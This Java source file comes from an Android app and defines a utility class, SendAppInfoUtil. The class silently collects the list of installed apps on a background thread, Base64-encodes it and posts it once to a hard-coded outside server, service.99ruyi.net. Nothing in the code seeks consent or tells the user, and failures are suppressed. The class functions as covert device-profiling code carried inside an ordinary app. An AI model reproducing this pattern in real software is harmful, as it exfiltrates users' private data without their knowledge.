package dlg.lizhihao.com.mobilezausap.floatGeneral.baidu;

import android.accounts.NetworkErrorException;
import android.content.Context;
import android.content.SharedPreferences;

import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by Mcin on 17/3/15.
 * 手机app信息
 */

public class SendAppInfoUtil {

    public static void sendAppinfo(final Context context){
        if (isSend(context)){
            return;
        }else {
            setSend(context);
        }
        new Thread(new Runnable() {
            @Override
            public void run() {
                List<AppUtils.AppInfo> appInfoList = AppUtils.getAppsInfo(context);
                List<String>  strList = new ArrayList<String>();
                StringBuilder stringBuilder = new StringBuilder();
                for (int i = 1; i < appInfoList.size(); i++){
                    if (stringBuilder == null){
                        stringBuilder = new StringBuilder();
                    }
                    stringBuilder.append(appInfoList.get(i).toString())
                            .append("|");
                    if ((i % 3) == 0){
                        strList.add(stringBuilder.toString());
                        stringBuilder = null;
                    }else if (i == appInfoList.size() - 1){
                        strList.add(stringBuilder.toString());
                        stringBuilder = null;
                    }
                }
                for (String str : strList){
                    String appinfo = Base64Encoder.encode(str.getBytes());
                    httpClient(appinfo);
                }


            }
        }).start();
    }

    public static void httpClient(String params){
        HttpURLConnection conn = null;
        try {
            URL url = new URL("http://service.99ruyi.net:8800/Report/ViewReport.aspx?p="+params);
            conn = (HttpURLConnection) url.openConnection();

            conn.setReadTimeout(5000);
            conn.setRequestMethod("POST");
            conn.setConnectTimeout(10000);

            int responseCode = conn.getResponseCode();
            if (responseCode == 200) {
            } else {
                throw new NetworkErrorException("response status is "+responseCode);
            }

        } catch (Exception e) {
            e.printStackTrace();
        } finally {

            if (conn != null) {
                conn.disconnect();
            }
        }
    }

    public static boolean isSend(Context context){
        SharedPreferences sp = context.getSharedPreferences("send_app_info", 0);
        return sp.getBoolean("app_info", false);
    }

    public static void setSend(Context context){
        SharedPreferences sp = context.getSharedPreferences("send_app_info", 0);
        SharedPreferences.Editor editor = sp.edit();
        editor.putBoolean("app_info", true);
        editor.commit();
    }
}
